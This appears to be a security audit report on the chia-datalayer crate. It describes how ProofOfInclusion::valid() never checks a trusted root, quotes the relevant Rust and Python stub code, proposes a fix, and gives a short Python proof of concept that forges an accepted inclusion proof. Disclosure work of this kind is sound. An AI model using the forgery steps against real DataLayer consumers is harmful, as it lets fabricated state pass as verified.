### Title
`ProofOfInclusion::valid()` Performs No Trusted-Root Verification, Allowing Forged DataLayer Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` only checks internal self-consistency of the proof's hash chain. It derives its "root" from the proof itself (`last.combined_hash`) rather than from any externally-supplied trusted root. The final check `existing_hash == self.root_hash()` is a tautology that is always true after the loop completes without error. An unprivileged attacker who can supply a serialized `ProofOfInclusion` to any caller that uses `valid()` as the sole acceptance gate can forge a proof for any arbitrary `node_hash`, causing the verifier to accept fabricated DataLayer state.

### Finding Description

`ProofOfInclusion::valid()` is defined as:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()  // ← always true after loop
}
```

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← derived from the proof itself
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash` holds the last `calculated_hash`, which was already verified to equal `layer.combined_hash` (the last layer's `combined_hash`). `self.root_hash()` returns that same `last.combined_hash`. Therefore `existing_hash == self.root_hash()` is unconditionally true whenever the loop completes without returning `false`. The function never compares against any externally-supplied, trusted tree root.

The `ProofOfInclusion` struct is a `Streamable` type with full Python bindings (`from_bytes`, `from_bytes_unchecked`, `parse_rust`, `from_json_dict`) exposed via `datalayer.pyi`. Any Python caller that receives a `ProofOfInclusion` from an untrusted source, deserializes it, and calls `proof.valid()` as the acceptance gate will accept any internally-consistent (but fabricated) proof.

An attacker constructs a forged proof as follows:
1. Choose any target `node_hash` (the leaf they claim is in the tree).
2. Choose arbitrary `other_hash` values and `other_hash_side` values for each layer.
3. Compute each `combined_hash` as `calculate_internal_hash(prev_hash, side, other_hash)` to make the chain consistent.
4. Serialize and submit. `valid()` returns `true`.

The root cause is identical in class to the external report: user-supplied data (the proof bytes) is parsed and accepted without proper validation against a trusted external reference (the known tree root).

### Impact Explanation

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."**

Any DataLayer consumer that calls `proof.valid()` without separately checking `proof.root_hash()` against a known, trusted root will accept forged inclusion proofs. This allows an attacker to prove that arbitrary key-value pairs exist in a DataLayer store when they do not, enabling fabricated state attestation across any system that relies on DataLayer inclusion proofs for trust decisions.

### Likelihood Explanation

The Python binding exposes `ProofOfInclusion` as a first-class Streamable object with `from_bytes` and `valid()`. The API design strongly implies that `valid()` is a complete validity check. Any integrator who receives a proof over the network and calls `proof.valid()` without an additional `proof.root_hash() == known_root` check is vulnerable. The attacker needs only the ability to submit a crafted serialized `ProofOfInclusion` — no keys, no privileged access.

### Recommendation

`valid()` must accept a trusted root hash parameter and compare against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root
}
```

The existing `valid()` (no-argument form) should either be removed or clearly documented as an internal-consistency-only check that is insufficient for security decisions. The Python binding should expose only the root-checking variant.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Attacker wants to forge a proof that node_hash X is in the tree.
node_hash = bytes([0xAA] * 32)   # arbitrary target leaf
other_hash = bytes([0xBB] * 32)  # arbitrary sibling

# Compute combined_hash to make the chain consistent
# (mirrors calculate_internal_hash with side=0: sha256(0x00 + node_hash + other_hash))
h = hashlib.sha256(b'\x00' + node_hash + other_hash).digest()
combined_hash = h

layer = ProofOfInclusionLayer(
    other_hash_side=0,
    other_hash=other_hash,
    combined_hash=combined_hash,
)
proof = ProofOfInclusion(node_hash=node_hash, layers=[layer])

# valid() returns True for a completely fabricated proof
assert proof.valid()  # passes — no trusted root checked
# proof.root_hash() == combined_hash, which the attacker chose freely
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L31-58)
```rust
impl ProofOfInclusion {
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }

    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1155-1196)
```rust
    pub fn get_proof_of_inclusion(
        &self,
        key: KeyId,
    ) -> Result<proof_of_inclusion::ProofOfInclusion, Error> {
        let mut index = *self
            .block_status_cache
            .get_index_by_key(key)
            .ok_or(Error::UnknownKey(key))?;

        let node = self
            .get_node(index)?
            .expect_leaf("key to index mapping should only have leaves");

        let parents = self.get_lineage_blocks_with_indexes(index)?;
        let mut layers: Vec<proof_of_inclusion::ProofOfInclusionLayer> = Vec::new();
        let mut parents_iter = parents.iter();
        // first in the lineage is the index itself, second is the first parent
        parents_iter.next();
        for (next_index, block) in parents_iter {
            if block.metadata.dirty {
                return Err(Error::Dirty(*next_index));
            }
            let parent = block
                .node
                .expect_internal("all nodes after the first should be internal");
            let sibling_index = parent.sibling_index(index)?;
            let sibling_block = self.get_block(sibling_index)?;
            let sibling = sibling_block.node;
            let layer = proof_of_inclusion::ProofOfInclusionLayer {
                other_hash_side: parent.get_sibling_side(index)?,
                other_hash: sibling.hash(),
                combined_hash: parent.hash,
            };
            layers.push(layer);
            index = *next_index;
        }

        Ok(proof_of_inclusion::ProofOfInclusion {
            node_hash: node.hash,
            layers,
        })
    }
```
